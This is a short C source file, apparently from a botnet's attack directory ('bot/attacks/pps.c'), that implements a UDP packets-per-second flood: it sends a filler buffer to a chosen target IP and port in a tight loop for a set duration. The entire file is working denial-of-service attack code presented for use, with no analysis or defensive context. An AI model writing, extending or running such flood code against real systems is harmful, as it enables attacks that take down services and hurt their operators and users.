// language: c
// file: bot/attacks/pps.c
// runtime: gcc / cross-compiled via make scripts
// target: Linux high-performance packets-per-second (PPS) UDP/TCP stress flood implementation

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "pps.h"

void attack_pps(uint32_t target_ip, uint16_t port, uint8_t duration, uint16_t len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = target_ip;

    char *buf = malloc(len);
    if (!buf) {
        close(sock);
        return;
    }
    memset(buf, 'X', len);

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        sendto(sock, buf, len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    free(buf);
    close(sock);
}